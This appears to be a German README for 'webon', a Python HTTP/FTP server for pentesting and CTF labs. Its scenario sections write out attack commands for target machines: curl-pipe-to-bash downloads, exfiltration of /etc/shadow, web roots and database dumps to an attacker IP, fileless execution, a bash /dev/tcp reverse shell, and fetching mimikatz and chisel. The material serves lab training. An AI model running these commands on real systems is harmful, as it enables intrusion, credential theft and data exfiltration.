# 🌐 webon

[![Python 3.6+](https://img.shields.io/badge/python-3.6+-blue.svg)](https://www.python.org/downloads/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![HTB Ready](https://img.shields.io/badge/HTB-Ready-green.svg)](https://www.hackthebox.com/)

**Ein schneller HTTP/FTP-Server für Pentesting und CTF mit Upload-Funktion.**

> Perfekt für Hack The Box, TryHackMe, OSCP und andere Pentesting-Szenarien.

---

## ✨ Features

- 🌐 **HTTP-Server** mit POST-Upload
- 📡 **FTP-Server** mit Anonymous-Zugang
- 📤 **Upload standardmäßig aktiviert**
- 🎨 **Farbige Logs** mit Zeitstempel
- 🔒 **Path Traversal Schutz**
- ⚡ **Threaded** für parallele Verbindungen
- 🪟 **Windows-kompatibel** (FTP.exe)

---

## 🚀 Quick Start

```bash
# HTTP-Server starten (Upload aktiviert!)
sudo webon -o /opt/tools

# FTP-Server starten (Anonymous, kein Passwort)
sudo webon -o /opt/tools --ftp
```

**Auf der Zielmaschine:**
```bash
# Download & Execute
curl 10.10.14.5/linpeas.sh | bash

# Ergebnis hochladen
curl -X POST --data-binary @loot.txt http://10.10.14.5/loot.txt
```

---

## 📦 Installation

```bash
# Repository klonen
git clone https://github.com/yourusername/webon.git
cd webon

# Ausführbar machen
chmod +x webon.py

# Optional: Global installieren
sudo cp webon.py /usr/local/bin/webon

# Für FTP-Support
pip install pyftpdlib --break-system-packages
```

---

## 📖 Verwendung

### Grundlegende Syntax

```
webon (-f FILE | -o ORDNER) [OPTIONEN]
```

### HTTP-Modus (Standard)

```bash
# Ordner bereitstellen (Port 80)
sudo webon -o /opt/tools

# Ohne Upload
sudo webon -o /opt/tools -n

# Eigener Port (kein root nötig)
webon -o /opt/tools -p 8080

# Einzelne Datei
sudo webon -f exploit.sh
```

### FTP-Modus

```bash
# Anonymous FTP (kein Login nötig)
sudo webon -o /opt/tools --ftp

# Mit Authentifizierung
sudo webon -o /opt/tools --ftp --ftp-user admin --ftp-pass secret

# Eigener Port
webon -o /opt/tools --ftp -p 2121
```

---

## 🎯 HTB/CTF Szenarien

### Szenario 1: Download & Execute

```bash
# Auf deinem Angreifer-PC
sudo webon -o /opt/tools
```

```bash
# Auf der Zielmaschine
curl 10.10.14.5/linpeas.sh | bash
curl 10.10.14.5/linpeas.sh | sh
wget -qO- 10.10.14.5/linpeas.sh | bash
```

### Szenario 2: Loot einsammeln

```bash
# Auf deinem Angreifer-PC (in /opt/loot arbeiten)
cd /opt/loot
sudo webon -o /opt/tools
```

```bash
# Auf der Zielmaschine - Dateien hochladen
curl -X POST --data-binary @/etc/passwd http://10.10.14.5/passwd.txt
curl -X POST --data-binary @/etc/shadow http://10.10.14.5/shadow.txt
cat /etc/passwd | curl -X POST --data-binary @- http://10.10.14.5/passwd.txt
```

### Szenario 3: DDexec / Fileless Execution

```bash
# Auf deinem Angreifer-PC
sudo webon -o /opt/tools
```

```bash
# Auf der Zielmaschine - Binary fileless ausführen
curl 10.10.14.5/binary.b64 | bash <(curl 10.10.14.5/ddexec.sh) /bin/bash
curl 10.10.14.5/shell.b64 | bash <(curl 10.10.14.5/ddexec.sh) /proc/self/fd/0
```

### Szenario 4: Reverse Shell Payload holen

```bash
# Auf deinem Angreifer-PC
echo 'bash -i >& /dev/tcp/10.10.14.5/4444 0>&1' > /opt/tools/shell.sh
sudo webon -o /opt/tools
nc -lvnp 4444
```

```bash
# Auf der Zielmaschine
curl 10.10.14.5/shell.sh | bash
```

### Szenario 5: Windows-Target mit FTP

```bash
# Auf deinem Angreifer-PC
sudo webon -o /opt/tools --ftp
```

```cmd
REM Auf der Windows-Zielmaschine
ftp 10.10.14.5
> anonymous
> anonymous
> binary
> get nc.exe
> get mimikatz.exe
> bye
```

### Szenario 6: Exfiltration großer Dateien

```bash
# Auf deinem Angreifer-PC
cd /opt/loot
sudo webon -o /opt/tools --max-upload-size 524288000  # 500MB
```

```bash
# Auf der Zielmaschine
tar czf - /var/www | curl -X POST --data-binary @- http://10.10.14.5/www.tar.gz
mysqldump -u root database | curl -X POST --data-binary @- http://10.10.14.5/db.sql
```

### Szenario 7: Pivoting - Chisel/Ligolo Setup

```bash
# Auf deinem Angreifer-PC
sudo webon -o /opt/tools
```

```bash
# Auf der Zielmaschine
curl 10.10.14.5/chisel -o /tmp/chisel && chmod +x /tmp/chisel
/tmp/chisel client 10.10.14.5:8000 R:socks
```

---

## ⚙️ Alle Optionen

| Option | Kurz | Default | Beschreibung |
|--------|------|---------|--------------|
| `--file` | `-f` | - | Einzelne Datei bereitstellen |
| `--ordner` | `-o` | - | Ordner bereitstellen |
| `--port` | `-p` | 80/21 | Server-Port |
| `--bind` | `-b` | 0.0.0.0 | Bind-Adresse |
| `--no-upload` | `-n` | - | Upload deaktivieren |
| `--upload-dir` | - | cwd | Upload-Zielverzeichnis |
| `--max-upload-size` | - | 100MB | Max. Upload-Größe |
| `--allow-hidden` | - | - | Hidden-Files erlauben |
| `--no-listing` | - | - | Directory Listing aus |
| `--ftp` | - | - | FTP-Modus aktivieren |
| `--ftp-user` | - | anonymous | FTP Username |
| `--ftp-pass` | - | (leer) | FTP Passwort |

---

## 📊 Log-Ausgabe

### HTTP

```
======================================================================
🌐 HTTP-Server läuft: http://0.0.0.0:80  [alle Interfaces]
📤 Upload aktiviert: Max. 100MB → /opt/loot
💡 Tipp: curl -X POST --data-binary @datei.txt http://0.0.0.0:80/datei.txt
🛑 Beenden mit STRG+C
======================================================================

[14:23:15] ✅ 200 OK: linpeas.sh (847.2KB) → 10.10.11.23
[14:23:42] 📥 Empfange Upload: passwords.txt (2341 bytes) ← 10.10.11.23
[14:23:42] ✅ Upload gespeichert: /opt/loot/passwords.txt (2.3KB) ← 10.10.11.23
```

### FTP

```
======================================================================
📡 FTP-Server läuft: ftp://0.0.0.0:21  [alle Interfaces]
📂 Root-Verzeichnis: /opt/tools
📤 Upload aktiviert: Max. 100MB → /opt/loot
🛑 Beenden mit STRG+C
======================================================================

[14:25:10] 🔌 FTP Verbindung: 10.10.11.23
[14:25:12] 🔐 FTP Login: anonymous ← 10.10.11.23
[14:25:20] ⬇️  FTP Download: nc.exe (45.3KB) → 10.10.11.23
[14:25:45] ⬆️  FTP Upload: sam.hiv (256KB) ← 10.10.11.23
```

---

## 🆚 HTTP vs FTP

| Feature | HTTP | FTP |
|---------|:----:|:---:|
| Windows Built-in | ❌ | ✅ ftp.exe |
| Direkt ausführen | ✅ `curl \| bash` | ❌ |
| Mehrere Dateien | Einzeln | ✅ mget |
| Resume | ❌ | ✅ |
| Interaktiv | ❌ | ✅ |
| Geschwindigkeit | ✅ Schneller | Langsamer |

**Empfehlung:**
- **Linux:** HTTP (curl/wget meistens da)
- **Windows:** FTP (ftp.exe immer da)
- **Viele Dateien:** FTP
- **Fileless Exec:** HTTP

---

## 🛡️ Sicherheit

- ✅ Path Traversal Schutz
- ✅ Sichere Dateinamen (keine Pfadkomponenten)
- ✅ Upload-Größenlimit
- ✅ Hidden-Files standardmäßig blockiert
- ⚠️ FTP ist unverschlüsselt (nur in isolierten Netzen verwenden)

---

## 🔧 Troubleshooting

### Port 80 braucht Root
```bash
# Option 1: Mit sudo
sudo webon -o /opt/tools

# Option 2: Höherer Port
webon -o /opt/tools -p 8080

# Option 3: Capability setzen (einmalig)
sudo setcap cap_net_bind_service=+ep $(which python3)
```

### FTP-Modul fehlt
```bash
pip install pyftpdlib --break-system-packages
# oder
sudo apt install python3-pyftpdlib
```

### Upload schlägt fehl
```bash
# Verzeichnis-Rechte prüfen
ls -la /opt/loot

# Upload-Limit erhöhen
webon -o . --max-upload-size 524288000  # 500MB
```

---

## 📝 Beispiel-Workflow

```bash
# 1. Terminal: Server starten
cd /opt/htb/box-name/loot
sudo webon -o /opt/htb/tools

# 2. Terminal: Listener
nc -lvnp 4444

# 3. Auf Zielmaschine: Tools holen
curl 10.10.14.5/linpeas.sh | bash
curl 10.10.14.5/pspy64 -o /tmp/pspy && chmod +x /tmp/pspy

# 4. Auf Zielmaschine: Ergebnisse hochladen
curl -X POST --data-binary @/tmp/results.txt http://10.10.14.5/results.txt
```

---

## 📚 Weitere Dokumentation

- [CURL_ALTERNATIVES.md](CURL_ALTERNATIVES.md) - Wenn curl nicht verfügbar ist
- [EXAMPLES.md](EXAMPLES.md) - Weitere Beispiele

---

## 🤝 Contributing

Pull Requests sind willkommen! Für größere Änderungen bitte erst ein Issue öffnen.

---

## 📄 Lizenz

MIT License - siehe [LICENSE](LICENSE)

---

## ⭐ Star History

Wenn dir **webon** hilft, gib dem Repo einen ⭐!

---

**Made with ❤️ for the Pentesting Community**
